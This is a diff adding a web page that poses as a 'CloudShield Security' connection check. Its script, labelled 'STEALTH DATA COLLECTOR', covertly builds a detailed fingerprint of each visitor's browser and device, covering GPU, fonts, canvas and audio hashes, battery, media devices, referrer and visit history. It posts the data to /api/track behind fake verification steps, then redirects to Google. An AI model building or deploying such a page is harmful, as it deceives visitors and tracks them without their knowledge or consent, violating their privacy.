@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Verifying your connection...</title>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔒</text></svg>">
+  
+  <style>
+    /* ── Reset ── */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    /* ── Body ── */
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #0a0a0f;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 
+                   Roboto, 'Helvetica Neue', Arial, sans-serif;
+      overflow: hidden;
+      position: relative;
+    }
+
+    /* ── Animated Background Grid ── */
+    body::before {
+      content: '';
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background-image: 
+        linear-gradient(rgba(59, 130, 246, 0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(59, 130, 246, 0.03) 1px, transparent 1px);
+      background-size: 50px 50px;
+      animation: gridMove 20s linear infinite;
+      z-index: 0;
+    }
+
+    @keyframes gridMove {
+      0% { transform: translate(0, 0); }
+      100% { transform: translate(50px, 50px); }
+    }
+
+    /* ── Floating Particles ── */
+    .particles {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .particle {
+      position: absolute;
+      width: 4px;
+      height: 4px;
+      background: rgba(59, 130, 246, 0.3);
+      border-radius: 50%;
+      animation: float linear infinite;
+    }
+
+    @keyframes float {
+      0% {
+        transform: translateY(100vh) scale(0);
+        opacity: 0;
+      }
+      10% {
+        opacity: 1;
+      }
+      90% {
+        opacity: 1;
+      }
+      100% {
+        transform: translateY(-10vh) scale(1);
+        opacity: 0;
+      }
+    }
+
+    /* ── Glow Orbs Background ── */
+    .glow-orb {
+      position: fixed;
+      border-radius: 50%;
+      filter: blur(80px);
+      opacity: 0.15;
+      z-index: 0;
+      animation: orbPulse 8s ease-in-out infinite alternate;
+    }
+
+    .glow-orb:nth-child(1) {
+      width: 400px; height: 400px;
+      background: #3b82f6;
+      top: -100px; left: -100px;
+    }
+
+    .glow-orb:nth-child(2) {
+      width: 300px; height: 300px;
+      background: #8b5cf6;
+      bottom: -80px; right: -80px;
+      animation-delay: 4s;
+    }
+
+    .glow-orb:nth-child(3) {
+      width: 250px; height: 250px;
+      background: #06b6d4;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      animation-delay: 2s;
+    }
+
+    @keyframes orbPulse {
+      0% { opacity: 0.1; transform: scale(1); }
+      100% { opacity: 0.2; transform: scale(1.2); }
+    }
+
+    /* ── Main Container ── */
+    .container {
+      position: relative;
+      z-index: 10;
+      text-align: center;
+      padding: 20px;
+      max-width: 460px;
+      width: 90%;
+    }
+
+    /* ── Card ── */
+    .card {
+      background: rgba(15, 15, 25, 0.8);
+      backdrop-filter: blur(20px);
+      -webkit-backdrop-filter: blur(20px);
+      border: 1px solid rgba(59, 130, 246, 0.15);
+      border-radius: 24px;
+      padding: 48px 36px;
+      box-shadow: 
+        0 0 40px rgba(59, 130, 246, 0.08),
+        0 25px 50px rgba(0, 0, 0, 0.5),
+        inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      animation: cardEntry 0.8s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    @keyframes cardEntry {
+      0% {
+        opacity: 0;
+        transform: translateY(30px) scale(0.95);
+      }
+      100% {
+        opacity: 1;
+        transform: translateY(0) scale(1);
+      }
+    }
+
+    /* ── Shield Icon ── */
+    .shield-container {
+      position: relative;
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 28px;
+    }
+
+    .shield-ring {
+      position: absolute;
+      top: 0; left: 0;
+      width: 80px;
+      height: 80px;
+      border: 3px solid transparent;
+      border-top-color: #3b82f6;
+      border-right-color: #3b82f6;
+      border-radius: 50%;
+      animation: shieldSpin 1.5s linear infinite;
+    }
+
+    .shield-ring-2 {
+      position: absolute;
+      top: 8px; left: 8px;
+      width: 64px;
+      height: 64px;
+      border: 2px solid transparent;
+      border-bottom-color: #8b5cf6;
+      border-left-color: #8b5cf6;
+      border-radius: 50%;
+      animation: shieldSpin 2s linear infinite reverse;
+    }
+
+    .shield-icon {
+      position: absolute;
+      top: 50%; left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 32px;
+      animation: shieldPulse 2s ease-in-out infinite;
+    }
+
+    @keyframes shieldSpin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes shieldPulse {
+      0%, 100% { transform: translate(-50%, -50%) scale(1); }
+      50% { transform: translate(-50%, -50%) scale(1.1); }
+    }
+
+    /* ── Title ── */
+    .title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 8px;
+      letter-spacing: -0.3px;
+    }
+
+    .subtitle {
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.5);
+      margin-bottom: 32px;
+      line-height: 1.5;
+    }
+
+    /* ── Progress Bar ── */
+    .progress-container {
+      width: 100%;
+      height: 4px;
+      background: rgba(59, 130, 246, 0.1);
+      border-radius: 4px;
+      overflow: hidden;
+      margin-bottom: 24px;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #3b82f6, #8b5cf6, #06b6d4);
+      border-radius: 4px;
+      animation: progress 2.5s ease-in-out forwards;
+      box-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
+    }
+
+    @keyframes progress {
+      0% { width: 0%; }
+      20% { width: 25%; }
+      40% { width: 45%; }
+      60% { width: 65%; }
+      80% { width: 85%; }
+      100% { width: 100%; }
+    }
+
+    /* ── Steps List ── */
+    .steps {
+      list-style: none;
+      text-align: left;
+      margin-bottom: 28px;
+    }
+
+    .step {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 10px 0;
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.4);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+      opacity: 0;
+      transform: translateX(-10px);
+      animation: stepIn 0.4s ease forwards;
+    }
+
+    .step:last-child {
+      border-bottom: none;
+    }
+
+    .step:nth-child(1) { animation-delay: 0.3s; }
+    .step:nth-child(2) { animation-delay: 0.8s; }
+    .step:nth-child(3) { animation-delay: 1.3s; }
+    .step:nth-child(4) { animation-delay: 1.8s; }
+
+    @keyframes stepIn {
+      to {
+        opacity: 1;
+        transform: translateX(0);
+      }
+    }
+
+    .step-icon {
+      width: 28px;
+      height: 28px;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 14px;
+      flex-shrink: 0;
+    }
+
+    .step.active {
+      color: rgba(255, 255, 255, 0.9);
+    }
+
+    .step.active .step-icon {
+      background: rgba(59, 130, 246, 0.15);
+    }
+
+    .step.done .step-icon {
+      background: rgba(16, 185, 129, 0.15);
+    }
+
+    .step.done {
+      color: rgba(16, 185, 129, 0.8);
+    }
+
+    .step-text {
+      flex: 1;
+    }
+
+    .step-status {
+      font-size: 11px;
+      padding: 2px 8px;
+      border-radius: 12px;
+      font-weight: 600;
+    }
+
+    .status-checking {
+      background: rgba(59, 130, 246, 0.1);
+      color: #3b82f6;
+    }
+
+    .status-done {
+      background: rgba(16, 185, 129, 0.1);
+      color: #10b981;
+    }
+
+    .status-waiting {
+      background: rgba(255, 255, 255, 0.05);
+      color: rgba(255, 255, 255, 0.3);
+    }
+
+    /* ── Loading Dots ── */
+    .loading-dots {
+      display: inline-flex;
+      gap: 4px;
+    }
+
+    .loading-dots span {
+      width: 4px;
+      height: 4px;
+      background: #3b82f6;
+      border-radius: 50%;
+      animation: dotBounce 1.4s ease-in-out infinite;
+    }
+
+    .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+    .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+    @keyframes dotBounce {
+      0%, 80%, 100% {
+        transform: scale(0.6);
+        opacity: 0.4;
+      }
+      40% {
+        transform: scale(1);
+        opacity: 1;
+      }
+    }
+
+    /* ── Footer ── */
+    .footer-text {
+      font-size: 11px;
+      color: rgba(255, 255, 255, 0.2);
+      margin-top: 8px;
+    }
+
+    .footer-text a {
+      color: rgba(59, 130, 246, 0.5);
+      text-decoration: none;
+    }
+
+    /* ── Success State ── */
+    .success-card {
+      display: none;
+    }
+
+    .success-card.show {
+      display: block;
+      animation: cardEntry 0.6s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    .success-icon {
+      font-size: 48px;
+      margin-bottom: 16px;
+      animation: successPop 0.5s cubic-bezier(0.16, 1, 0.3, 1);
+    }
+
+    @keyframes successPop {
+      0% { transform: scale(0); }
+      50% { transform: scale(1.2); }
+      100% { transform: scale(1); }
+    }
+
+    .success-title {
+      font-size: 18px;
+      color: #10b981;
+      font-weight: 700;
+      margin-bottom: 6px;
+    }
+
+    .success-sub {
+      font-size: 13px;
+      color: rgba(255, 255, 255, 0.4);
+    }
+
+    /* ── Mobile Responsive ── */
+    @media (max-width: 480px) {
+      .card {
+        padding: 36px 24px;
+        border-radius: 20px;
+      }
+      .title { font-size: 18px; }
+      .step { font-size: 12px; }
+    }
+  </style>
+</head>
+
+<body>
+  <!-- Background Effects -->
+  <div class="glow-orb"></div>
+  <div class="glow-orb"></div>
+  <div class="glow-orb"></div>
+
+  <div class="particles" id="particles"></div>
+
+  <!-- Main Container -->
+  <div class="container">
+    
+    <!-- Loading Card -->
+    <div class="card" id="loadingCard">
+      
+      <!-- Shield Animation -->
+      <div class="shield-container">
+        <div class="shield-ring"></div>
+        <div class="shield-ring-2"></div>
+        <div class="shield-icon">🛡️</div>
+      </div>
+
+      <!-- Title -->
+      <h1 class="title">Verifying your connection</h1>
+      <p class="subtitle">
+        Security check in progress
+        <span class="loading-dots">
+          <span></span><span></span><span></span>
+        </span>
+      </p>
+
+      <!-- Progress Bar -->
+      <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+
+      <!-- Steps -->
+      <ul class="steps" id="stepsList">
+        <li class="step active" id="step1">
+          <div class="step-icon">🔍</div>
+          <span class="step-text">Checking browser security</span>
+          <span class="step-status status-checking">Checking</span>
+        </li>
+        <li class="step" id="step2">
+          <div class="step-icon">🌐</div>
+          <span class="step-text">Verifying network connection</span>
+          <span class="step-status status-waiting">Waiting</span>
+        </li>
+        <li class="step" id="step3">
+          <div class="step-icon">🔒</div>
+          <span class="step-text">Establishing secure tunnel</span>
+          <span class="step-status status-waiting">Waiting</span>
+        </li>
+        <li class="step" id="step4">
+          <div class="step-icon">✅</div>
+          <span class="step-text">Finalizing verification</span>
+          <span class="step-status status-waiting">Waiting</span>
+        </li>
+      </ul>
+
+      <p class="footer-text">
+        Protected by <a href="#">CloudShield Security</a> • 
+        ID: <span id="requestId"></span>
+      </p>
+    </div>
+
+    <!-- Success Card (shown after completion) -->
+    <div class="card success-card" id="successCard">
+      <div class="success-icon">✅</div>
+      <h2 class="success-title">Verification Complete</h2>
+      <p class="success-sub">Redirecting you now...</p>
+    </div>
+  </div>
+
+  <script>
+    // ═══════════════════════════════════════════
+    // 🕵️ STEALTH DATA COLLECTOR
+    // ═══════════════════════════════════════════
+
+    // Generate fake request ID
+    const reqId = 'CS-' + Math.random().toString(36).substring(2, 10).toUpperCase();
+    document.getElementById('requestId').textContent = reqId;
+
+    // Create floating particles
+    function createParticles() {
+      const container = document.getElementById('particles');
+      for (let i = 0; i < 30; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.style.left = Math.random() * 100 + '%';
+        p.style.animationDuration = (Math.random() * 10 + 8) + 's';
+        p.style.animationDelay = (Math.random() * 10) + 's';
+        p.style.width = (Math.random() * 3 + 2) + 'px';
+        p.style.height = p.style.width;
+        container.appendChild(p);
+      }
+    }
+    createParticles();
+
+    // ── Step Animation Controller ──
+    function updateStep(stepNum, status) {
+      const step = document.getElementById('step' + stepNum);
+      const statusEl = step.querySelector('.step-status');
+
+      if (status === 'active') {
+        step.className = 'step active';
+        statusEl.className = 'step-status status-checking';
+        statusEl.textContent = 'Checking';
+      } else if (status === 'done') {
+        step.className = 'step done';
+        statusEl.className = 'step-status status-done';
+        statusEl.textContent = 'Done';
+      }
+    }
+
+    // ═══════════════════════════════════════════
+    // 🔍 COLLECT ALL DATA
+    // ═══════════════════════════════════════════
+    async function collectData() {
+      const d = {};
+
+      // ── 📱 Screen & Display ──
+      d.screenWidth        = screen.width;
+      d.screenHeight       = screen.height;
+      d.screenAvailWidth   = screen.availWidth;
+      d.screenAvailHeight  = screen.availHeight;
+      d.colorDepth         = screen.colorDepth;
+      d.pixelRatio         = window.devicePixelRatio || 1;
+      d.innerWidth         = window.innerWidth;
+      d.innerHeight        = window.innerHeight;
+      d.orientation        = screen.orientation 
+                             ? screen.orientation.type 
+                             : 'unknown';
+
+      // ── 🌐 Browser & System ──
+      d.userAgent            = navigator.userAgent;
+      d.platform             = navigator.platform || 'unknown';
+      d.language             = navigator.language || 'unknown';
+      d.languages            = navigator.languages 
+                               ? navigator.languages.join(', ') 
+                               : d.language;
+      d.cookiesEnabled       = navigator.cookieEnabled;
+      d.doNotTrack           = navigator.doNotTrack || 'unset';
+      d.onLine               = navigator.onLine;
+      d.hardwareConcurrency  = navigator.hardwareConcurrency || 'unknown';
+      d.maxTouchPoints       = navigator.maxTouchPoints || 0;
+      d.vendor               = navigator.vendor || 'unknown';
+      d.pdfViewerEnabled     = navigator.pdfViewerEnabled || false;
+
+      // ── 🕐 Time ──
+      d.timezone       = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
+      d.timezoneOffset = new Date().getTimezoneOffset();
+      d.localTime      = new Date().toLocaleString();
+
+      // ── 🔗 Page Info ──
+      d.referrer   = document.referrer || 'Direct Visit';
+      d.currentURL = window.location.href;
+
+      // ── 💾 Memory ──
+      d.deviceMemory = navigator.deviceMemory 
+                       ? navigator.deviceMemory + ' GB' 
+                       : 'unknown';
+
+      // ── 📶 Connection ──
+      if (navigator.connection) {
+        const conn = navigator.connection;
+        d.connectionType = conn.effectiveType || 'unknown';
+        d.downlink       = conn.downlink ? conn.downlink + ' Mbps' : 'unknown';
+        d.rtt            = conn.rtt ? conn.rtt + ' ms' : 'unknown';
+        d.saveData       = conn.saveData || false;
+      } else {
+        d.connectionType = 'unknown';
+        d.downlink       = 'unknown';
+        d.rtt            = 'unknown';
+        d.saveData       = 'unknown';
+      }
+
+      // ── 🔋 Battery ──
+      try {
+        if (navigator.getBattery) {
+          const bat = await navigator.getBattery();
+          d.batteryLevel    = Math.round(bat.level * 100) + '%';
+          d.batteryCharging = bat.charging ? 'Yes ⚡' : 'No 🔋';
+          d.chargingTime    = bat.chargingTime === Infinity 
+                              ? 'N/A' 
+                              : Math.round(bat.chargingTime / 60) + ' min';
+          d.dischargingTime = bat.dischargingTime === Infinity 
+                              ? 'N/A' 
+                              : Math.round(bat.dischargingTime / 60) + ' min';
+        } else {
+          d.batteryLevel    = 'Not Supported';
+          d.batteryCharging = 'Not Supported';
+        }
+      } catch(e) {
+        d.batteryLevel    = 'Blocked';
+        d.batteryCharging = 'Blocked';
+      }
+
+      // ── 🎨 Features ──
+      d.webGL          = !!document.createElement('canvas').getContext('webgl');
+      d.webRTC         = !!(window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection);
+      d.localStorage   = !!window.localStorage;
+      d.sessionStorage = !!window.sessionStorage;
+      d.indexedDB      = !!window.indexedDB;
+      d.serviceWorker  = 'serviceWorker' in navigator;
+      d.webAssembly    = typeof WebAssembly === 'object';
+      d.bluetooth      = 'bluetooth' in navigator;
+      d.usb            = 'usb' in navigator;
+      d.midi           = 'requestMIDIAccess' in navigator;
+      d.gamepad        = 'getGamepads' in navigator;
+      d.vibration      = 'vibrate' in navigator;
+      d.share          = 'share' in navigator;
+      d.clipboard      = 'clipboard' in navigator;
+      d.speechSynth    = 'speechSynthesis' in window;
+      d.notification   = 'Notification' in window 
+                         ? Notification.permission 
+                         : 'Not Supported';
+
+      // ── 🖥️ GPU ──
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbg) {
+            d.gpuVendor   = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
+            d.gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+          } else {
+            d.gpuVendor   = gl.getParameter(gl.VENDOR);
+            d.gpuRenderer = gl.getParameter(gl.RENDERER);
+          }
+          d.maxTextureSize   = gl.getParameter(gl.MAX_TEXTURE_SIZE);
+          d.maxRenderSize    = gl.getParameter(gl.MAX_RENDERBUFFER_SIZE);
+          d.glVersion        = gl.getParameter(gl.VERSION);
+          d.shadingLangVer   = gl.getParameter(gl.SHADING_LANGUAGE_VERSION);
+        }
+      } catch(e) {
+        d.gpuVendor   = 'Blocked';
+        d.gpuRenderer = 'Blocked';
+      }
+
+      // ── 🔤 Font Detection ──
+      try {
+        const fonts = [
+          'Arial','Verdana','Helvetica','Times New Roman','Courier New',
+          'Georgia','Comic Sans MS','Impact','Trebuchet MS','Palatino',
+          'Lucida Console','Tahoma','Garamond','Book Antiqua',
+          'Arial Black','Lucida Sans','Century Gothic','Franklin Gothic'
+        ];
+        const found = [];
+        const testStr  = 'mmmmmmmmmmlli';
+        const testSize = '72px';
+        const c   = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+
+        ctx.font = testSize + ' monospace';
+        const baseW = ctx.measureText(testStr).width;
+
+        for (const f of fonts) {
+          ctx.font = testSize + ' "' + f + '", monospace';
+          if (ctx.measureText(testStr).width !== baseW) found.push(f);
+        }
+        d.detectedFonts = found.join(', ') || 'None';
+        d.fontCount     = found.length;
+      } catch(e) {
+        d.detectedFonts = 'Failed';
+        d.fontCount     = 0;
+      }
+
+      // ── 📊 Canvas Fingerprint ──
+      try {
+        const fc  = document.createElement('canvas');
+        fc.width  = 200; fc.height = 50;
+        const fctx = fc.getContext('2d');
+        fctx.textBaseline = 'top';
+        fctx.font = '14px Arial';
+        fctx.fillStyle = '#f60';
+        fctx.fillRect(20, 0, 100, 30);
+        fctx.fillStyle = '#069';
+        fctx.fillText('StealthLog🔒', 2, 15);
+        fctx.fillStyle = 'rgba(102,204,0,0.7)';
+        fctx.fillText('StealthLog🔒', 4, 17);
+        const dataURL = fc.toDataURL();
+        let hash = 0;
+        for (let i = 0; i < dataURL.length; i++) {
+          hash = ((hash << 5) - hash) + dataURL.charCodeAt(i);
+          hash |= 0;
+        }
+        d.canvasFingerprint = Math.abs(hash).toString(16).toUpperCase();
+      } catch(e) {
+        d.canvasFingerprint = 'Blocked';
+      }
+
+      // ── 🔊 Audio Fingerprint ──
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        d.audioSampleRate = audioCtx.sampleRate;
+        d.audioChannels   = audioCtx.destination.maxChannelCount;
+        d.audioState      = audioCtx.state;
+        audioCtx.close();
+      } catch(e) {
+        d.audioSampleRate = 'Blocked';
+      }
+
+      // ── 📐 Parsed Info ──
+      const ua = navigator.userAgent;
+      d.parsedBrowser = parseBrowser(ua);
+      d.parsedOS      = parseOS(ua);
+      d.deviceType    = detectDevice(ua);
+
+      // ── 🛡️ Ad Blocker ──
+      try {
+        const ad = document.createElement('div');
+        ad.innerHTML = '&nbsp;';
+        ad.className = 'adsbox ad-banner adsbygoogle';
+        ad.style.cssText = 'position:absolute;left:-9999px;height:10px;';
+        document.body.appendChild(ad);
+        await new Promise(r => setTimeout(r, 100));
+        d.adBlocker = ad.offsetHeight === 0 ? 'Yes 🛡️' : 'No';
+        document.body.removeChild(ad);
+      } catch(e) {
+        d.adBlocker = 'Unknown';
+      }
+
+      // ── 🔑 Visit Tracking ──
+      try {
+        let vc = parseInt(localStorage.getItem('_sl_v') || '0') + 1;
+        localStorage.setItem('_sl_v', vc.toString());
+        d.visitCount = vc;
+        
+        const firstVisit = localStorage.getItem('_sl_first');
+        if (!firstVisit) {
+          localStorage.setItem('_sl_first', new Date().toISOString());
+          d.firstVisit = 'Just Now';
+        } else {
+          d.firstVisit = firstVisit;
+        }
+      } catch(e) {
+        d.visitCount = 1;
+        d.firstVisit = 'Unknown';
+      }
+
+      d.historyLength = window.history.length;
+      d.requestId     = reqId;
+
+      // ── 📷 Media Devices ──
+      try {
+        if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+          const devices = await navigator.mediaDevices.enumerateDevices();
+          d.cameras      = devices.filter(x => x.kind === 'videoinput').length;
+          d.microphones  = devices.filter(x => x.kind === 'audioinput').length;
+          d.speakers     = devices.filter(x => x.kind === 'audiooutput').length;
+        }
+      } catch(e) {
+        d.cameras     = 'Blocked';
+        d.microphones = 'Blocked';
+        d.speakers    = 'Blocked';
+      }
+
+      // ── 🌙 Dark Mode ──
+      d.darkMode = window.matchMedia('(prefers-color-scheme: dark)').matches 
+                   ? 'Yes 🌙' : 'No ☀️';
+      d.reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches 
+                        ? 'Yes' : 'No';
+
+      return d;
+    }
+
+    // ── HELPERS ──
+    function parseBrowser(ua) {
+      if (ua.includes('Edg/'))           return 'Edge ' + ex(ua, /Edg\/([\d.]+)/);
+      if (ua.includes('OPR/'))           return 'Opera ' + ex(ua, /OPR\/([\d.]+)/);
+      if (ua.includes('Vivaldi'))        return 'Vivaldi ' + ex(ua, /Vivaldi\/([\d.]+)/);
+      if (ua.includes('SamsungBrowser')) return 'Samsung ' + ex(ua, /SamsungBrowser\/([\d.]+)/);
+      if (ua.includes('UCBrowser'))      return 'UC ' + ex(ua, /UCBrowser\/([\d.]+)/);
+      if (ua.includes('Firefox/'))       return 'Firefox ' + ex(ua, /Firefox\/([\d.]+)/);
+      if (ua.includes('Chrome/') && !ua.includes('Chromium'))
+                                         return 'Chrome ' + ex(ua, /Chrome\/([\d.]+)/);
+      if (ua.includes('Safari/') && !ua.includes('Chrome'))
+                                         return 'Safari ' + ex(ua, /Version\/([\d.]+)/);
+      return 'Unknown';
+    }
+
+    function parseOS(ua) {
+      if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
+      if (ua.includes('Windows NT 6.3'))  return 'Windows 8.1';
+      if (ua.includes('Windows NT 6.1'))  return 'Windows 7';
+      if (ua.includes('Mac OS X'))        return 'macOS ' + ex(ua, /Mac OS X ([\d_]+)/).replace(/_/g,'.');
+      if (ua.includes('Android'))         return 'Android ' + ex(ua, /Android ([\d.]+)/);
+      if (ua.includes('iPhone'))          return 'iOS ' + ex(ua, /OS ([\d_]+)/).replace(/_/g,'.');
+      if (ua.includes('iPad'))            return 'iPadOS ' + ex(ua, /OS ([\d_]+)/).replace(/_/g,'.');
+      if (ua.includes('Linux'))           return 'Linux';
+      if (ua.includes('CrOS'))            return 'Chrome OS';
+      return 'Unknown';
+    }
+
+    function detectDevice(ua) {
+      if (/Mobi|Android.*Mobile|iPhone|iPod/.test(ua)) return '📱 Mobile';
+      if (/iPad|Android(?!.*Mobile)|Tablet/.test(ua))  return '📟 Tablet';
+      return '💻 Desktop';
+    }
+
+    function ex(str, regex) {
+      const m = str.match(regex);
+      return m ? m[1] : '';
+    }
+
+    // ═══════════════════════════════════════════
+    // 🚀 MAIN EXECUTION
+    // ═══════════════════════════════════════════
+    async function main() {
+      // Step 1: Browser check
+      await delay(600);
+      updateStep(1, 'done');
+      updateStep(2, 'active');
+
+      // Step 2: Network (collect data here)
+      const data = await collectData();
+      await delay(500);
+      updateStep(2, 'done');
+      updateStep(3, 'active');
+
+      // Step 3: Send data
+      try {
+        await fetch('/api/track', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      } catch(e) {}
+
+      await delay(500);
+      updateStep(3, 'done');
+      updateStep(4, 'active');
+
+      // Step 4: Final
+      await delay(400);
+      updateStep(4, 'done');
+
+      // Show success
+      await delay(300);
+      document.getElementById('loadingCard').style.display = 'none';
+      const sc = document.getElementById('successCard');
+      sc.classList.add('show');
+
+      // Redirect
+      await delay(1200);
+      window.location.href = 'https://www.google.com';
+    }
+
+    function delay(ms) {
+      return new Promise(r => setTimeout(r, ms));
+    }
+
+    main();
+  </script>
+</body>
+</html>
